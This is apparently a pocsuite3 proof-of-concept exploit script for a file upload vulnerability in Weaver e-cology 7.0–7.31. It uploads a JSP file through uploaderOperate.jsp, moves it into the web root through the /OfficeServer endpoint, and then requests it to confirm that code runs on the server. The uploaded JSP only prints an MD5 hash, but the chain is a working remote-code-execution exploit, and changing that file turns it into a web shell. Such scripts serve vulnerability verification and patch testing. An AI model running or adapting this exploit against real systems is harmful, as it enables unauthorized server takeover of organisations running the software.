from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 e-cology uploaderOperate.jsp 存在文件上传漏洞'
    appName = '泛微 e-cology'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司的e-cology存在文件上传漏洞，攻击者利用该漏洞可以获取服务器权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            'Referer':self.url
        }
        filec = '''<%@ page textType="text/html; charset=GBK"%>
<%@page import="java.math.BigInteger"%>
<%@page import="java.security.MessageDigest"%>
<%

MessageDigest md5 = null;
md5 = MessageDigest.getInstance("MD5");
String s = "123";
String miyao = "abc";
String jiamichuan = s + miyao;
md5.update(jiamichuan.getBytes());
String md5String = new BigInteger(1, md5.digest()).toString(16);
out.println(md5String);

%>'''
        path = '/workrelate/plan/util/uploaderOperate.jsp'
        files = {'secId': ("","1",""),
                 'Filedata': ("test123.jsp",filec,""),
                 'plandetailid': ("","1","")
                 }
        vulur = self.url+path
        base_resp = requests.post(vulur, headers = headers, verify = False, allow_redirects = False, timeout = 10, files = files)
        if  base_resp.status_code == 200 and "test123.jsp" in base_resp.text and 'btn_wh' in base_resp.text:
            fileid = re.findall(r'''href='/workrelate/plan/util/ViewDoc\.jsp\?id=\d+?&plandetailid=1&fileid=(.*?)'>''',base_resp.text)[0]
            path = '/OfficeServer'
            files = {'111': ("","{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'"+fileid+"'}","")
                    }
            vulur2 = self.url+path
            base_resp2 = requests.post(vulur2, headers = headers, verify = False, allow_redirects = False, timeout = 10, files = files)
            if  base_resp2.status_code == 200 and filec in base_resp2.text:
                tpath = "/test123.jsp"
                vulur1 = self.url+tpath
                base_resp1 = requests.get(vulur1, headers = headers, verify = False, allow_redirects = False, timeout = 10)
                if base_resp1.status_code == 200 and 'a906449d5769fa7361d7ecc6aa3f6d28' in base_resp1.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vulur
                    result['VerifyInfo']['content'] = vulur1
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
